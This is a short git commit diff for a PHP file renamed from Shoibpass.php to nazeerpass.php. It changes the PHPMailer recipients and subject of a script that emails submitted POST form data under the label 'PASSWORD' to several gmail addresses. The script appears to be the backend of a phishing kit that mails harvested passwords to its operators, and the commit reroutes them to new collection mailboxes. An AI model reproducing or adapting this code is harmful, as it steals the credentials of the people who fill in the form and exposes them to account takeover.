d55af5e1ff28d9a141860297080f02b6adf1b595
yingoonin <yingoonin@gmail.com>
2025-07-19 16:33:16 +0800

    Update and rename Shoibpass.php to nazeerpass.php

--- nazeerpass.php
+++ nazeerpass.php
@@ -34,15 +34,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
         // Email properties
-        $mail->setFrom('rutherfordhenress@gmail.com', 'PASSWORD');
-        $mail->addAddress('rutherfordhenress@gmail.com');
-        $mail->addAddress('shohiebnizamani@gmail.com');
+        $mail->addAddress('rutherfordhenress@gmail.com', 'PASSWORD');
+        $mail->addAddress('approval.ads.monica.ramey@gmail.com');
+        $mail->addAddress('hibuads87@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'SHOIB';
+        $mail->Subject = 'nazeer';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
